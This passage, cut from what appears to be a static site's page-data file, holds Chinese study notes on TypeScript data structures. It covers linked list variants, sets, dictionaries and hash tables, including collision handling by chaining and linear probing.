7.双向链表的其他方法isEmpty和size继承父类即可，clear需要先调父类的clear然后再清空tail，toString逻辑跟父类一样只是里面用的是DoublyNode，inverseToString跟toString类似，只需要将head换成tail然后next换成prev即可。\n\n\n# 循环链表数据结构\n\n    在链表的基础上，将尾部元素的next指向首部元素而不是置空，以此形成循环。\n\n\n# 循环链表的实现\n\n    循环链表代码细节：circular-linked-list.ts\n\n    循环链表是基于链表的，那么让CircularLinkedList继承LinkedList，再重写push、unshift、removeAt方法。很简单，先super调用父类的同名方法，再调一下固定方法formingCycle以此形成循环。formingCycle方法其实就是遍历链表找到尾部元素，然后将尾部元素的next指向head即可。\n\n\n# 双向循环链表数据结构\n\n    在双向链表的基础上，将尾部元素的next指向首部元素，将首部元素的prev指向尾部元素，以此形成循环。\n\n\n# 双向循环链表的实现\n\n    双向循环链表代码细节：doubly-circular-linked-list.ts\n\n    双向循环链表是基于双向链表的那么让DoublyCircularLinkedList继承DoublyLinkedList，再重写push、unshift、removeAt方法。很简单，先super调用父类的同名方法，再调一下固定方法formingCycle以此形成循环。formingCycle方法其实就是将tail的next指向head再将head的prev指向tail。\n\n\n# 有序链表数据结构\n\n    保证元素按照一定规则顺序插入的链表结构。（这个顺序指的是元素的值的顺序，而链表本身因为指针也是有顺序的，要区别开这两个“顺序”）\n\n\n# 有序链表的实现\n\n    有序链表代码细节：sorted-linked-list.ts\n\n    有序链表是基于单向链表的，也可以用双向的，这里实现的是单向的有序链表。让SortedLinkedList继承LinkedList，声明一个compareFn属性（初始化时默认传的是升序比较函数）。\n    push、unshift其实相当于调用insert，因为插入都要走统一的比较方法。在插入时，要比较新元素与链表里元素的值，这里因为是升序，所以必选找到比新元素的大的位置，这个位置将会由新元素插入，当然旧元素会补到这个新元素的next上，以此形成升序；如果找不到比新元素的大的位置，那么新元素会放到尾部元素的next上，因为它最大。\n\n\n# 基于双向链表的栈数据结构\n\n    实现栈时，我们也可以选用双向链表，当然你选单向链表也是可以的（要稍微调整一下代码）。\n\n\n# 基于双向链表的栈的实现\n\n    基于双向链表的栈代码细节：stack-linked-list.ts\n\n    声明一个私有变量_items，类型为DoublyLinkedList，入栈时就调用双向链表的push方法，而出栈时就调用双向链表的removeAt(this.size() - 1)，查看栈顶元素就调用双向链表的getTail方法，其他的功能很好实现。",normalizedContent:"# 链表\n\n\n# 背景\n\n> 要存储多个元素，数组（或列表）可能是最常用的数据结构。它非常方便，提供了[]语法来访问其元素。但它有个缺点：（在大多数语言中）数组的大小是固定的，并且从数组的起点或中间插入或移除项的成本很高，因为需要移动元素。（尽管有来自array类方法可以帮助我们做这些事，但背后的情况同样如此）——《学习javascript数据结构与算法》\n\n\n# 链表数据结构\n\n    链表(linkedlist)是一个数据元素按照链式存储结构进行存储的并且逻辑结构上符合一般线性表特性的数据结构。它的数据元素由一个存储元素本身的节点和一个指向下一个元素的引用（指针）组成的（因此形成了元素之间的一对一的关系，也就是线性结构特性）。\n\n    它相对于数组的好处是，添加或移除元素的时候不需要移动其他元素。但是链表需要使用指针，并且访问链表中的元素需要从起点（链表首部）开始迭代至你需要的元素。\n\n\n# 栈、队列与链表的区别\n\n    在逻辑结构上，他们都具有线性结构也就是线性表的特性（有唯一的前驱和后继），栈和队列属于受限线性表（受限表示对结点的操作受限制），而链表属于一般线性表（也就是不受限）。\n    在存储结构上，栈和队列是顺序存储结构，也就是用一组地址连续的存储单元依次存储线性表中的数据元素；而链表就不一样了，它是链式存储结构，也就是用一组任意的存储单元存储线性表中的数据元素（可连续也可不连续）。\n\n\n# 链表的实现\n\n    链表的实现代码细节：linked-list.ts\n\n    1.需要准备一个助手类node，这个助手类有两个属性，一个是本身的值，另一个是指向下一个node的指针。\n\n    2.声明一个protected级别的变量head，用于追踪首部元素；声明一个count用于记录链表的大小；声明一个equalsfn，保存实例化时传来的“比较函数”。\n\n    3.返回链表中特定位置的元素getelementat：\n        从head首部元素开始向后遍历，直到遍历到指定位置就返回这个位置的项，当然如果当前项是空的自然就中断遍历返回空结果。\n\n    4.返回元素在链表中的索引indexof：\n        从head首部元素开始向后遍历，直到当前项与目标项通过equalsfn对比结果为相同时结束遍历并返回当前项的索引，遍历完都没找到相同的话就返回-1，当然如果当前项是空的自然就中断遍历返回-1。\n\n    5.往链表尾部添加元素push：\n        链表为空时，添加的新元素就是head首部元素；链表不为空时，需要将新元素追加到尾部，用迭代的方式（getelementat方法）拿到尾部元素（node.next为空时代表node就是尾部元素）。最后记得更新count的值。\n\n    6.从链表中移除元素removeat：\n        和push类似，当链表只有一个元素时只需把head清空；当链表元素多于一个时，需要迭代（getelementat方法）到指定位置再将其移除，移除后还要把它的next与它的上一个位置连接起来，保证移除一个元素后链表是完整的。\n        扩展：用indexof和removeat配合可以组成新的移除方法，就是移除与指定项相同的元素（目前只能移除一个）。\n\n    7.往链表首部添加元素unshift：\n        链表为空时，添加的新元素就是head首部元素；链表不为空时，需要将新元素的next指向head，然后再把新元素赋给head以完成新元素与链表的连接。最后记得更新count的值。\n\n    8.往链表中特定位置插入一个新元素insert：\n        要放到第一个位置时，其实就是调用unshift；其他情况，需要拿到指定位置的前一个位置的元素，并把这个元素的next赋给新元素，再让这个元素的next指向新元素，以完成链表的连接。最后记得更新count的值。\n\n    9.链表的其他方法isempty、size、clear、tostring很好实现。\n\n\n# 双向链表数据结构\n\n    双向链表(doublylinkedlist)是一个特殊的链表。区别就是它的数据元素由一个存储元素本身的节点、一个指向下一个元素的引用、一个指向上一个元素的引用组成的。也就是说双向链表拥有双向的引用，而链表拥有单向的引用。\n\n\n# 双向链表的实现\n\n    双向链表的实现代码细节：doubly-linked-list.ts\n\n    1.我们需要准备一个跟node不一样的助手类doublynode，这个助手类有三个属性，一个是本身的值，另一个是指向下一个doublynode的指针，最后一个是指向上一个doublynode的指针。\n\n    2.我们让doublylinkedlist继承linkedlist，可以使用父类的方法和属性。声明两个属性，head指向首部元素（第一个），tail指向尾部元素（最后一个），记得类型得是doublynode，其他的同linkedlist。\n\n    3.往双向链表尾部添加元素push：\n        链表为空时，将新元素赋给head和tail；链表不为空时，需要将新元素追加到尾部，也就是将新元素的next指向tail的next，新元素的prev指向tail，但此时的链表还没指向新元素，那么就让tail的next指向新元素，最后把tail更新也就是把新元素赋给tail（这四个步骤要仔细理清楚）。最后记得更新count的值。\n\n    4.往双向链表首部添加元素unshift：\n        链表为空时，将新元素赋给head和tail；链表不为空时，需要将新元素追加到首部，也就是将新元素的prev指向head的prev，新元素的next指向head，但此时的链表还没指向新元素，那么就让head的prev指向新元素，最后把head更新也就是把新元素赋给head（这四个步骤有个别顺序不能打乱，自己理一理）。最后记得更新count的值。\n\n    5.在双向链表的任意位置插入新元素insert：\n        当要插入的位置是第一个位置或者最后一个位置，相当于调用unshift或push方法；其他场景，需要拿到指定位置的前一个位置的元素，然后把新元素连接到刚刚这元素后面，再更新一些引用（指针），例如：新元素的next要指向刚刚这元素的next，新元素的next的prev要指向新元素，新元素的prev要指向刚刚这元素，刚刚这元素的next要指向新元素（比起unshift和push要复杂，理清楚就好了）。最后记得更新count的值。\n\n    6.从双向链表中移除元素removeat：\n        当链表只有一个元素时只需把head和tail清空；当移除的是首部元素时，需要将head指向head的next，再把head的prev置空即可；当移除的是尾部元素时，需要将tail指向tail的prev，再把tail的next置空即可；需要迭代（getelementat方法）到指定位置，再把这个位置的prev的next指向这个位置的next，再把这个位置的next的prev指向这个位置的prev，这样就可以把这个位置上的元素从双向链表中移除。\n        扩展：用indexof和removeat配合可以组成新的移除方法，就是移除与指定项相同的元素（目前只能移除一个）。\n\n    7.双向链表的其他方法isempty和size继承父类即可，clear需要先调父类的clear然后再清空tail，tostring逻辑跟父类一样只是里面用的是doublynode，inversetostring跟tostring类似，只需要将head换成tail然后next换成prev即可。\n\n\n# 循环链表数据结构\n\n    在链表的基础上，将尾部元素的next指向首部元素而不是置空，以此形成循环。\n\n\n# 循环链表的实现\n\n    循环链表代码细节：circular-linked-list.ts\n\n    循环链表是基于链表的，那么让circularlinkedlist继承linkedlist，再重写push、unshift、removeat方法。很简单，先super调用父类的同名方法，再调一下固定方法formingcycle以此形成循环。formingcycle方法其实就是遍历链表找到尾部元素，然后将尾部元素的next指向head即可。\n\n\n# 双向循环链表数据结构\n\n    在双向链表的基础上，将尾部元素的next指向首部元素，将首部元素的prev指向尾部元素，以此形成循环。\n\n\n# 双向循环链表的实现\n\n    双向循环链表代码细节：doubly-circular-linked-list.ts\n\n    双向循环链表是基于双向链表的那么让doublycircularlinkedlist继承doublylinkedlist，再重写push、unshift、removeat方法。很简单，先super调用父类的同名方法，再调一下固定方法formingcycle以此形成循环。formingcycle方法其实就是将tail的next指向head再将head的prev指向tail。\n\n\n# 有序链表数据结构\n\n    保证元素按照一定规则顺序插入的链表结构。（这个顺序指的是元素的值的顺序，而链表本身因为指针也是有顺序的，要区别开这两个“顺序”）\n\n\n# 有序链表的实现\n\n    有序链表代码细节：sorted-linked-list.ts\n\n    有序链表是基于单向链表的，也可以用双向的，这里实现的是单向的有序链表。让sortedlinkedlist继承linkedlist，声明一个comparefn属性（初始化时默认传的是升序比较函数）。\n    push、unshift其实相当于调用insert，因为插入都要走统一的比较方法。在插入时，要比较新元素与链表里元素的值，这里因为是升序，所以必选找到比新元素的大的位置，这个位置将会由新元素插入，当然旧元素会补到这个新元素的next上，以此形成升序；如果找不到比新元素的大的位置，那么新元素会放到尾部元素的next上，因为它最大。\n\n\n# 基于双向链表的栈数据结构\n\n    实现栈时，我们也可以选用双向链表，当然你选单向链表也是可以的（要稍微调整一下代码）。\n\n\n# 基于双向链表的栈的实现\n\n    基于双向链表的栈代码细节：stack-linked-list.ts\n\n    声明一个私有变量_items，类型为doublylinkedlist，入栈时就调用双向链表的push方法，而出栈时就调用双向链表的removeat(this.size() - 1)，查看栈顶元素就调用双向链表的gettail方法，其他的功能很好实现。",charsets:{cjk:!0}},{title:"5.集合",frontmatter:{title:"5.集合"},regularPath:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/5.%E9%9B%86%E5%90%88.html",relativePath:"book-web/数据结构与算法/5.集合.md",key:"v-93e993f8",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/5.%E9%9B%86%E5%90%88.html",headers:[{level:2,title:"集合数据结构",slug:"集合数据结构",normalizedTitle:"集合数据结构",charIndex:9},{level:2,title:"集合实现",slug:"集合实现",normalizedTitle:"集合实现",charIndex:110},{level:2,title:"集合的运算",slug:"集合的运算",normalizedTitle:"集合的运算",charIndex:1679},{level:3,title:"并集",slug:"并集",normalizedTitle:"并集",charIndex:91},{level:3,title:"交集",slug:"交集",normalizedTitle:"交集",charIndex:94},{level:3,title:"差集",slug:"差集",normalizedTitle:"差集",charIndex:97},{level:3,title:"子集",slug:"子集",normalizedTitle:"子集",charIndex:313}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"集合数据结构 集合实现 集合的运算 并集 交集 差集 子集",content:"# 集合\n\n\n# 集合数据结构\n\n    集合是由一组无序且唯一（即不能重复）的元素组成。元素之间没有任何关系；空集是不包含任何元素的集合。\n    可以像数学当中的集合一样，可进行并集、交集、差集等基本运算。\n\n\n# 集合实现\n\n    其实在es2015，新增了Set类作为JavaScript API的一部分，所以我们可以直接使用它（跟Array一样可以不用自己实现，但在这里还是实现一下Set，开发过程中直接使用es2015的Set），但是这个Set缺少并集、交集、差集等基本功能，这个可以去util.ts中找寻union（并集）、intersection（交集）、difference（差集）、isSubsetOf（子集）等方法实现细节。\n\n    集合实现代码细节：set.ts\n\n    1.声明一个私有变量_items用于存储集合里的元素，类型选用对象（用属性名保证不重复）。声明一个私有变量_count用于记录集合大小。\n\n    2.has方法，判断元素是否在集合中，其实就是判断对象中是否有这个属性。\n\nObject.prototype.hasOwnProperty.call(this._items, element);\n\n\n1\n\n\n    如果你使用this._items.hasOwnProperty(element)，这个可能会有问题。一般对象的hasOwnProperty继承自Object.prototype的hasOwnProperty，而这hasOwnProperty方法可能会被覆盖，况且并不是所有的对象都继承有Object.prototype，所以这里直接使用Object.prototype.hasOwnProperty和call更好。\n\n    3.add方法，向集合添加一个新元素。先用has方法判断这个元素是否已经存在于集合中了，不存在再将新元素添加到_item里，再更新_count。\n\n    4.delete方法，从集合移除一个元素。先用has方法判断这个元素是否已经存在于集合中了，存在再去_item里使用delete运算符删除该元素，再更新_count。\n\n    5.size方法，返回集合所包含元素的数量。因为我们声明了_count变量，并且在添加和删除都会更新它，返回它是最方便的。如果我们没有声明_count，我们可以\n\nreturn Object.keys(this._items).length;\n\n\n1\n\n\n如果不想使用Object.keys（es5可以用于遍历对象而不能遍历数组，es2015都可遍历），那么你也可以这样\n\nlet count = 0;\nfor (const key in this._items) {\n    if (Object.prototype.hasOwnProperty.call(this._items, key)) {\n        count ++;\n    }\n}\nreturn count;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n    6.values方法，返回一个包含集合中所有值（元素）的数组。我们可以\n\nreturn Object.values(this._items);\n\n\n1\n\n\n如果不想使用es2017才支持的Object.values，那么你也可以这样\n\nconst values: T[] = [];\nfor (const key in this._items) {\n    if (Object.prototype.hasOwnProperty.call(this._items, key)) {\n        values.push(this._items[key]);\n    }\n}\nreturn values;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n    7.clear方法就是置空_items和置零_count；toString先掉values方法，再遍历调用各自的toString然后拼在一起即可。\n\n\n# 集合的运算\n\n\n# 并集\n\n> 定义：对于给定的两个集合，返回一个包含两个集合中所有元素的新集合。\n\n    在util.ts中的union有实现\n\n    思路：遍历集合A，将集合A的所有元素add进新集合；遍历集合B，将集合B的所有元素add进新集合。新集合就是AB集合的并集，因为add时会避免掉重复的元素。\n\n    使用展开运算符...，再配合Set的构造函数会更简单\n\nreturn new Set<T>([...setA, ...setB]);\n\n\n1\n\n\n\n# 交集\n\n> 定义：对于给定的两个集合，返回一个包含两个集合中共有元素的新集合。\n\n    在util.ts中的intersection有实现\n\n    思路：遍历集合A，判断当前元素是否存在于集合B中，如果存在就把这个元素放入新集合中，遍历完后集合A后，新集合就是AB集合的交集。\n\n    使用展开运算符...和Set的构造函数再配合filter方法会更简单\n\nlet smallerSet: Set<T> = setA; // 我们默认遍历小的\nlet biggerSet: Set<T> = setB;\nif (setA.size > setB.size) {// 如果B更小就对调\n    smallerSet = setB;\n    biggerSet = setA;\n}\nreturn new Set<T>([...smallerSet].filter(x => biggerSet.has(x)));\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 差集\n\n> 定义：对于给定的两个集合，返回一个包含所有存在于第一个集合且不存在于第二个集合的元素的新集合。\n\n    在util.ts中的difference有实现\n\n    思路：遍历集合A，判断当前元素是否存在于集合B中，如果不存在就把这个元素放入新集合中，遍历完后集合A后，新集合就是AB集合的差集。\n\n    使用展开运算符...和Set的构造函数再配合filter方法会更简单\n\nreturn new Set<T>([...setA].filter(x => !setB.has(x)));\n\n\n1\n\n\n\n# 子集\n\n> 定义：验证一个给定集合是否是另一个集合的子集。\n\n    在util.ts中的isSubsetOf有实现\n\n    思路：遍历集合A，判断当前元素是否存在于集合B中，如果每次遍历都存在，那么集合A是集合B的子集。\n\n    使用展开运算符...，再配合every方法会更简单\n\nreturn [...setA].every(x => setB.has(x));\n\n\n1\n",normalizedContent:"# 集合\n\n\n# 集合数据结构\n\n    集合是由一组无序且唯一（即不能重复）的元素组成。元素之间没有任何关系；空集是不包含任何元素的集合。\n    可以像数学当中的集合一样，可进行并集、交集、差集等基本运算。\n\n\n# 集合实现\n\n    其实在es2015，新增了set类作为javascript api的一部分，所以我们可以直接使用它（跟array一样可以不用自己实现，但在这里还是实现一下set，开发过程中直接使用es2015的set），但是这个set缺少并集、交集、差集等基本功能，这个可以去util.ts中找寻union（并集）、intersection（交集）、difference（差集）、issubsetof（子集）等方法实现细节。\n\n    集合实现代码细节：set.ts\n\n    1.声明一个私有变量_items用于存储集合里的元素，类型选用对象（用属性名保证不重复）。声明一个私有变量_count用于记录集合大小。\n\n    2.has方法，判断元素是否在集合中，其实就是判断对象中是否有这个属性。\n\nobject.prototype.hasownproperty.call(this._items, element);\n\n\n1\n\n\n    如果你使用this._items.hasownproperty(element)，这个可能会有问题。一般对象的hasownproperty继承自object.prototype的hasownproperty，而这hasownproperty方法可能会被覆盖，况且并不是所有的对象都继承有object.prototype，所以这里直接使用object.prototype.hasownproperty和call更好。\n\n    3.add方法，向集合添加一个新元素。先用has方法判断这个元素是否已经存在于集合中了，不存在再将新元素添加到_item里，再更新_count。\n\n    4.delete方法，从集合移除一个元素。先用has方法判断这个元素是否已经存在于集合中了，存在再去_item里使用delete运算符删除该元素，再更新_count。\n\n    5.size方法，返回集合所包含元素的数量。因为我们声明了_count变量，并且在添加和删除都会更新它，返回它是最方便的。如果我们没有声明_count，我们可以\n\nreturn object.keys(this._items).length;\n\n\n1\n\n\n如果不想使用object.keys（es5可以用于遍历对象而不能遍历数组，es2015都可遍历），那么你也可以这样\n\nlet count = 0;\nfor (const key in this._items) {\n    if (object.prototype.hasownproperty.call(this._items, key)) {\n        count ++;\n    }\n}\nreturn count;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n    6.values方法，返回一个包含集合中所有值（元素）的数组。我们可以\n\nreturn object.values(this._items);\n\n\n1\n\n\n如果不想使用es2017才支持的object.values，那么你也可以这样\n\nconst values: t[] = [];\nfor (const key in this._items) {\n    if (object.prototype.hasownproperty.call(this._items, key)) {\n        values.push(this._items[key]);\n    }\n}\nreturn values;\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n    7.clear方法就是置空_items和置零_count；tostring先掉values方法，再遍历调用各自的tostring然后拼在一起即可。\n\n\n# 集合的运算\n\n\n# 并集\n\n> 定义：对于给定的两个集合，返回一个包含两个集合中所有元素的新集合。\n\n    在util.ts中的union有实现\n\n    思路：遍历集合a，将集合a的所有元素add进新集合；遍历集合b，将集合b的所有元素add进新集合。新集合就是ab集合的并集，因为add时会避免掉重复的元素。\n\n    使用展开运算符...，再配合set的构造函数会更简单\n\nreturn new set<t>([...seta, ...setb]);\n\n\n1\n\n\n\n# 交集\n\n> 定义：对于给定的两个集合，返回一个包含两个集合中共有元素的新集合。\n\n    在util.ts中的intersection有实现\n\n    思路：遍历集合a，判断当前元素是否存在于集合b中，如果存在就把这个元素放入新集合中，遍历完后集合a后，新集合就是ab集合的交集。\n\n    使用展开运算符...和set的构造函数再配合filter方法会更简单\n\nlet smallerset: set<t> = seta; // 我们默认遍历小的\nlet biggerset: set<t> = setb;\nif (seta.size > setb.size) {// 如果b更小就对调\n    smallerset = setb;\n    biggerset = seta;\n}\nreturn new set<t>([...smallerset].filter(x => biggerset.has(x)));\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 差集\n\n> 定义：对于给定的两个集合，返回一个包含所有存在于第一个集合且不存在于第二个集合的元素的新集合。\n\n    在util.ts中的difference有实现\n\n    思路：遍历集合a，判断当前元素是否存在于集合b中，如果不存在就把这个元素放入新集合中，遍历完后集合a后，新集合就是ab集合的差集。\n\n    使用展开运算符...和set的构造函数再配合filter方法会更简单\n\nreturn new set<t>([...seta].filter(x => !setb.has(x)));\n\n\n1\n\n\n\n# 子集\n\n> 定义：验证一个给定集合是否是另一个集合的子集。\n\n    在util.ts中的issubsetof有实现\n\n    思路：遍历集合a，判断当前元素是否存在于集合b中，如果每次遍历都存在，那么集合a是集合b的子集。\n\n    使用展开运算符...，再配合every方法会更简单\n\nreturn [...seta].every(x => setb.has(x));\n\n\n1\n",charsets:{cjk:!0}},{title:"6.字典和散列表",frontmatter:{title:"6.字典和散列表"},regularPath:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/6.%E5%AD%97%E5%85%B8%E5%92%8C%E6%95%A3%E5%88%97%E8%A1%A8.html",relativePath:"book-web/数据结构与算法/6.字典和散列表.md",key:"v-1d3d450c",path:"/book-web/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/6.%E5%AD%97%E5%85%B8%E5%92%8C%E6%95%A3%E5%88%97%E8%A1%A8.html",headers:[{level:2,title:"字典数据结构",slug:"字典数据结构",normalizedTitle:"字典数据结构",charIndex:13},{level:2,title:"字典实现",slug:"字典实现",normalizedTitle:"字典实现",charIndex:137},{level:2,title:"散列表数据结构",slug:"散列表数据结构",normalizedTitle:"散列表数据结构",charIndex:1705},{level:2,title:"散列表实现",slug:"散列表实现",normalizedTitle:"散列表实现",charIndex:1743},{level:2,title:"解决散列表的冲突",slug:"解决散列表的冲突",normalizedTitle:"解决散列表的冲突",charIndex:2573},{level:3,title:"分离链接法",slug:"分离链接法",normalizedTitle:"分离链接法",charIndex:2657},{level:3,title:"软删除式的线性探查法",slug:"软删除式的线性探查法",normalizedTitle:"软删除式的线性探查法",charIndex:3296},{level:3,title:"真删除式的线性探查法",slug:"真删除式的线性探查法",normalizedTitle:"真删除式的线性探查法",charIndex:6675},{level:2,title:"更好的散列函数",slug:"更好的散列函数",normalizedTitle:"更好的散列函数",charIndex:8084},{level:2,title:"WeakMap和WeakSet",slug:"weakmap和weakset",normalizedTitle:"weakmap和weakset",charIndex:8512}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"字典数据结构 字典实现 散列表数据结构 散列表实现 解决散列表的冲突 分离链接法 软删除式的线性探查法 真删除式的线性探查法 更好的散列函数 WeakMap和WeakSet",content:"# 字典和散列表\n\n\n# 字典数据结构\n\n    字典(Dictionary)是一个以[键, 值]形式来存储唯一值的数据结构。     集合是以[值, 值]形式存储的，这是两者的区别；字典也称作映射、符号表或关联数组；null和undefined不可以用作键或值。\n\n\n# 字典实现\n\n    其实在es2015，新增了Map类作为JavaScript API的一部分，所以我们可以直接使用它（跟Array一样可以不用自己实现，但在这里还是实现一下Map，开发过程中直接使用es2015的Map）。\n\n    字典实现代码细节：dictionary.ts\n\n    1.先准备一个助手类ValuePair，作为字典的[键, 值]中的“值”。它含有两个公有属性value和key，还有一个重写的toString方法。\n\n    2.给字典类声明一个私有属性_table，它的类型当然是[键, 值]这样的形式。先选用对象类型，然后对象的属性名和属性值的存储形式必须是K:V，K这里一般就是选择String，而V当然就选择我们之前创建的ValuePair。具体如下\n\nprivate _table: { [K: string]: ValuePair<K, V> };\n\n\n1\n\n\n    3.再声明一个_toStrFn，用以接收实例化时外界传来的“any转字符串”方法，意思是“键”的类型我们需要统一转换成String，这样方便作为对象的属性名。\n\n    4.set方法，向字典中添加新元素。将key用_toStrFn的方法转换成String类型，然后以key作为_table的属性名、new ValuePair(key, value)作为_table的属性值形成一个[键, 值]形式的元素（重复的也会被覆盖）。\n\n    5.get方法，通过以键作为参数查找对应的值并返回。将key用_toStrFn的方法转换成String类型，然后用对象的[]来直接查找key对应的ValuePair，最后返回ValuePair.value即可。\n\n    6.hasKey方法，如果某个键值存在于该字典中返回true，否则返回false。这个很简单，直接调用get方法，然后判断get的结果是否为空。\n\n    7.remove方法，通过键来删除字典中对应的键值对。先调用hasKey方法判断这个key是否存在于字典中，存在的话使用delete操作符去删除_table对象中对应的属性名key。\n\n    8.keyValues方法，将字典中所有[键, 值]对返回。直接Object.values(this._table)就能得到。\n\n    9.values方法，将字典所包含的所有数值以数组形式返回。先调用keyValues，得到字典中所有[键, 值]对，然后配合map方法得出字典的所有数值。\n\n    10.keys方法，将字典所包含的所有键名以数组的形式返回。先调用keyValues，得到字典中所有[键, 值]对，然后配合map方法得出字典的所有键名。\n\n    11.forEach方法，迭代字典中所有的键值对（只要有一项不符合callBackFn就中断迭代）\n\npublic forEach(callBackFn: (key: K, value: V) => any) {\n    const valuePair = this.keyValues();\n    for (let i = 0, le = valuePair.length; i < le; i ++) {\n        const result = callBackFn(valuePair[i].key, valuePair[i].value);\n        if (result === false) {\n            break;\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n    11.其他方法size、isEmpty、clear、toString跟以往一样比较好实现。\n\n\n# 散列表数据结构\n\n    字典(HashTable或HashMap)是字典的散列表实现。\n\n    散列表使用了散列算法，散列算法的作用是尽可能快地在数据结构中找到一个值，它不像其他的方法要迭代整个数据结构。\n\n    散列表的应用有很多，例如关系型数据库中的表索引、JavaScript对象内部的实现（对象的每个属性和方法（成员）被储存为key对象类型，每个key指向对应的对象成员）。\n\n\n# 散列表实现\n\n    散列表实现代码细节：hash-table.ts\n\n    1.散列表的跟字典一样，同样声明了_table和_toStrFn，可以查看字典那一节回顾一下。\n\n    2.创建散列函数，采用的是lose lose散列函数，就是将键值中的每个字母的ASCII值相加。\n\nprivate loseloseHashCode(key: K): number {\n    if (typeof key === 'number') {\n        return key;\n    }\n    const tableKey = this._toStrFn(key);\n    let hash = 0;\n    for (let i = 0, le = tableKey.length; i < le; i ++) {\n        hash += tableKey.charCodeAt(i);\n    }\n    return hash % 37;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n    你可能对“% 37”这个处理感到不解，它主要是为了避免散列值超过number的最大值，将散列表约束在一个小的范围内。但是有新问题，这表里不就只能有37个元素了？下面一节会解决这个问题。\n\n    3.put、get、remove跟字典的里同名方法实现没什么区别，只是它的key多了一次散列处理。其他方法getTable、size、isEmpty、clear、toString也不作说明了，很简单。\n\n\n# 解决散列表的冲突\n\n    上面我们提到过，再“% 37”后，最终存下来的元素只有37个了，其他很多元素都会在相同的散列值那里被覆盖掉，我们解决的这个问题的方法有三种：分离链接法、线性探查法和双散列法。这里只说前两种。\n\n\n# 分离链接法\n\n    分离链接法就是为散列表的每一个位置创建链表，将相同散列值存储在各自的链表中以解决冲突。\n    这种方法虽然是最简单的处理冲突的方法，但是比较耗存储空间如果每个位置都用链表。\n\n    散列表分离链接法实现代码细节：hash-table-separate-chaining.ts\n\n    1.put方法，先通过散列函数拿到对应的散列值，然后通过对象的[]拿到对应位置的链表，如果这个链表为null就新创建一个链表赋给这个对象；我们将新元素通过链表的put方法添加到链表里，这样就完成了散列表新增元素的方法。\n\n    2.get方法，先通过散列函数拿到对应的散列值，然后通过对象的[]拿到对应位置的链表，如果链表为null或者链表中没有元素，就直接返回undefined；如果链表存在并且有元素，那么去遍历链表（从head开始通过next来遍历）只要key与元素存的key一样，证明这个元素就是我们要get的元素。\n\n    3.remove方法，原理同get方法类似，找到对应位置链表，遍历链表找到相同key的元素，使用链表的remove方法删除这个元素；在删除这个元素我们还需要做的一件事就是判断这个链表是否为空了，为空了就将链表从_table中delete掉。\n\n    4.其他方法getTable、size、isEmpty、clear、toString也不作说明了，很简单。\n\n\n# 软删除式的线性探查法\n\n    线性探查法将每个元素都存储在表中，而不是借助链表等外物来解决冲突。\n\n    当想向表中某个位置添加一个新元素的时候，如果索引为index的位置已经被占据了，就尝试index+1的位置，如果这个位置也被占据就尝试下一个直至找到空闲的位置。\n    它有个问题：删除时会用一个字段记录删除状态而不是真正的删除它，在查询时可能会查询很多位置的这个字段导致效率变慢。\n\n    软删除式的线性探查法实现代码细节：hash-table-linear-probing-lazy.ts\n\n    1.因为是用一个字段记录删除的状态，所以我们新建一个助手类ValuePairLazy，它比ValuePair多一个isDeleted字段，代表是否被删除了。\n\n    2.put方法，先通过散列函数拿到对应的散列值，然后通过对象的[]拿到对应位置的值；判断这个值是否不存在或者它存在的话isDeleted为true，意思是这个位置没有人占，可以将这个位置直接拿下把新元素存在这里；否则，我们让散列值的值+1，再看这个位置的有没有人占，有的话散列值再+1，直到找到空位置才赋值。\n\n    3.get方法\n\n/**\n * 通过以键值作为参数查找对应的值并返回\n * 情况复杂：\n * 1.哈希值所在的位置key相同并且没被删除就返回这个value，否则去下一个位置查找。 {1}\n * 2.下一个位置key相同并且也没被删除就返回这个value。否则只能去寻下下个位置了。{4}\n * 3.但是下一个位置key相同并且被删除就直接return undefined {2}\n * 4.一直找但key一直不相同（删不删除无所谓），就一直找，直到没有元素了（this._table[index]为空） {3}\n */\npublic get(key: K): V {\n    if (key == null) { // 参数不合法\n        return undefined;\n    }\n    const tableKey: number = this.hashCode(key);\n    if (this._table[tableKey] == null) { // 因为是线性，这个为空证明下面的也没有，直接返回undefined\n        return undefined;\n    }\n    // key相同，并且没被删除 {1}\n    if (this._table[tableKey].key === key && !this._table[tableKey].isDeleted) {\n        return this._table[tableKey].value;\n    } else {\n        let index: number = tableKey + 1;\n        while (this._table[index] != null && (this._table[index].key !== key\n            || this._table[index].isDeleted)) {\n            // 情况1：key相同并且被删除。是我们找的key，但被删除了那就直接return undefined {2}\n            if (this._table[index].key === key && this._table[index].isDeleted) {\n                return undefined;\n            }\n            index ++; // 情况2：key不相同，删不删除无所谓。此时必须找下一个位置以保证拿到相同key {3}\n        }\n        // 情况3：key相同并且没被删除或者this._table[index]根本就为空 {4}\n        return this._table[index] != null ? this._table[index].value : undefined;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n    4.remove方法\n\n/**\n * 通过键来删除字典中对应的键值对\n * 情况复杂：\n * 1.哈希值所在的位置key相同并且没被删除就返回这个value，否则去下一个位置查找。 {1}\n * 2.下一个位置key相同并且也没被删除就返回这个value。否则只能去寻下下个位置了。{4}\n * 3.但是下一个位置key相同并且被删除就直接return undefined {2}\n * 4.一直找但key一直不相同（删不删除无所谓），就一直找，直到没有元素了（this._table[index]为空） {3}\n */\npublic remove(key: K): boolean 